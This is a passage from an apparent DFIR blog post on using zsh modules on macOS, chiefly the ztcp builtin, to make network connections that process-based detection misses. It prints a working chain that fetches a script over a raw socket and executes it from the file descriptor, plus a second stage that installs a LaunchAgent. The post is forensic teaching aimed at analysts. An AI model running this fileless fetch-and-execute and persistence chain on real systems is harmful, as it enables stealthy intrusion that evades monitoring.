---
title: Living Inside the Shell: zsh Modules on macOS
url: https://dfir.ch/posts/zsh_modules/
source: Over Security
date: 2026-09-16
fetch_date: 2026-09-17T06:59:55.070922
---

# Living Inside the Shell: zsh Modules on macOS

[Home](https://dfir.ch/)
[ ]

Menu

* [Home](/)
* [Posts](/posts/)
* [Talks](/talks/)
* [Tweets](/tweets/)
* |

LIGHT

DARK

# Living Inside the Shell: zsh Modules on macOS

16 Sep 2026

**Table of Contents**

* + [Introduction](#introduction)
  + [zsh Modules](#zsh-modules)
  + [Raw TCP Without curl, wget, or nc](#raw-tcp-without-curl-wget-or-nc)
  + [A More Realistic Example](#a-more-realistic-example)
  + [`zsh/mapfile`: Files as an Associative Array](#zshmapfile-files-as-an-associative-array)
* [zsh/attr: Extended Attributes Without /usr/bin/xattr](#zshattr-extended-attributes-without-usrbinxattr)
  + [The DFIR Lesson](#the-dfir-lesson)

### Introduction

When investigating shell-based activity on macOS, it is tempting to focus on the usual suspects: `curl`, `osascript`, `python`, `xattr`, and similar utilities. But `zsh` itself provides considerably more functionality than simply executing commands. macOS uses `zsh` as the default interactive shell, and **zsh ships with a module system that can extend the shell with networking, file manipulation, extended-attribute access, and other functionality.**

Functionality commonly associated with separate utilities can instead be performed by builtins inside the already-running `zsh` process. As a result, there may be no corresponding `curl`, `rm`, or `xattr` process for an analyst to find. Detection gaps can arise when detection logic relies primarily on process execution and command-line telemetry.

The underlying network, filesystem, or extended-attribute activity still occurs, but attributing that behavior solely through child-process execution becomes much harder.

### zsh Modules

Modules can be loaded at runtime using `zmodload`:

```
zmodload zsh/net/tcp
```

Depending on the `zsh` build and platform, available modules can provide functionality such as:

```
zsh/net/tcp       TCP socket operations
zsh/net/socket    Unix domain sockets
zsh/system        Low-level system functionality
zsh/files         Built-in file operations
zsh/zutil         Utility functions
zsh/sched         Scheduled commands inside zsh
zsh/stat          File metadata through a builtin
zsh/mapfile       Map files into an associative array
zsh/attr          Extended-attribute operations
```

The distinction between an external command and a `shell builtin` is important when investigating a compromised macOS client or performing threat hunting. When `zsh` invokes an external utility such as `curl`, macOS has to execute another program. **This creates process-execution telemetry containing information such as the executable path, arguments, parent process, and code-signing metadata.**

Module-provided functionality behaves differently. After loading `zsh/net/tcp`, for example: `whence -v ztcp` identifies `ztcp` as a shell builtin. There is no separate `ztcp` executable that needs to be launched. The operation is therefore attributed to the existing `/bin/zsh` process rather than to a newly created child process. This distinction becomes important when detections rely primarily on executable names, command-line arguments, or parent-child relationships.

### Raw TCP Without curl, wget, or nc

One particularly interesting module is:

```
zmodload zsh/net/tcp
```

It exposes the `ztcp` builtin, which allows the shell itself to establish TCP connections. This becomes particularly interesting in macOS initial-access chains where `/bin/zsh` is already used as the execution engine. ClickFix-style execution chains are one example where shell execution plays an important role, as demonstrated in my talk “Deconstructing Modern macOS Initial Access Vectors” (slides on my [GitHub repo](https://github.com/malmoeb/presentations)).

With `zsh/net/tcp`, the shell does not necessarily need to launch another networking utility. It can establish the TCP connection itself.

**Example**

In the first terminal, create a harmless payload:

```
mkdir -p /tmp/zsh-modules
cd /tmp/zsh-modules

cat > payload.zsh <<'EOF'
print "[+] IT'S ALIVE!"
print "[+] PID: $$"
print "[+] User: $USER"
EOF

python3 -m http.server 8080
```

In another terminal, connect directly to the HTTP server:

```
zmodload zsh/net/tcp

ztcp 127.0.0.1 8080
fd=$REPLY

print -rn -u $fd -- \
  $'GET /payload.zsh HTTP/1.0\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n'

while IFS= read -r -u $fd line; do
    [[ "$line" == $'\r' || -z "$line" ]] && break
done

source /dev/fd/$fd

ztcp -c $fd
```

`ztcp` establishes the TCP connection and exposes the resulting file descriptor through the shell parameter `$REPLY`. We save that descriptor in `$fd`. The important point is that `zsh` now owns an open socket. **There is no curl, wget, or nc process involved.** We then write a minimal HTTP request directly to that descriptor:

```
GET /payload.zsh HTTP/1.0
Host: 127.0.0.1
Connection: close
```

At this point `zsh` is effectively speaking HTTP itself. `ztcp` is not an HTTP client; it merely provides the TCP stream. Constructing and parsing the application protocol is our responsibility. The most interesting part of the example is arguably the following line:

```
source /dev/fd/$fd
```

After the loop has consumed the HTTP response headers, the remaining bytes arriving through the socket represent the response body.
`/dev/fd/<n>` provides a pathname through which an already-open file descriptor can be accessed. Because the connected socket is represented by such a descriptor, `source /dev/fd/$fd` causes zsh to read the remaining bytes from that descriptor and interpret them as shell input.

This means that the example does not require a conventional payload file to be written to disk. The script content can be received through the socket and interpreted directly by the existing shell. That distinction matters during forensic analysis. **Searching the filesystem for a downloaded `payload.zsh` may produce nothing even though shell code was retrieved and executed.**

There is, however, an important difference.

A conventional `curl ... | zsh` chain creates additional process-execution telemetry: `curl` must execute to retrieve the content and another shell is normally started to interpret the pipe. With `ztcp` and `source`, both retrieval and interpretation can occur inside the already-running zsh process. The network connection still exists, but the expected `curl` process, its command line, and the additional shell process do not.

**One Important Limitation: TLS**

There is an important practical limitation. `zsh/net/tcp` provides a raw TCP connection. It is not an HTTP client and does not provide TLS itself. That makes manually speaking HTTP relatively straightforward. That significantly limits the practicality of `ztcp` as a drop-in replacement for `curl`, but it does not make the primitive irrelevant. Consequently, establishing a TCP connection to port 443 with `ztcp` does not establish a usable HTTPS session; the TLS handshake and subsequent encryption would still need to be implemented separately.

### A More Realistic Example

Let’s make the example slightly more realistic. We will retrieve a second-stage script through `zsh/net/tcp` and execute it directly from the socket. The script creates a harmless `LaunchAgent` that opens Calculator.app. The goal is not persistence itself, but to demonstrate how a more complete second stage can be delivered without `curl`, `wget`, or `nc`, and without first writing the downloaded script to disk.

**Server-side payload - payload.zsh**

```
#!/bin/zsh

print "[+] Second stage executing"
print "[+] Running inside zsh PID: $$"

PLIST="$HOME/Library/LaunchAgents/ch.dfir.zshdemo.plist"

mkdir -p "$HOME/Library/LaunchAgents"

PLIST_B64='BASE64_GOES_HERE'

print -rn -- "$PLIST_B64" |
    /usr/bin/base64 -D > "$PLIST"

/bin/launchctl bootout \
    "gui/$(id -u)" \
    "$PLIST" 2>/dev/null

/bin/launchctl bootstrap \
    "gui/$(id -u)" \
    "$PLIST"

print "[+] LaunchAgent bootstrapped"
```

For the lab, the LaunchAgent simply opens Calculator.app to provide ...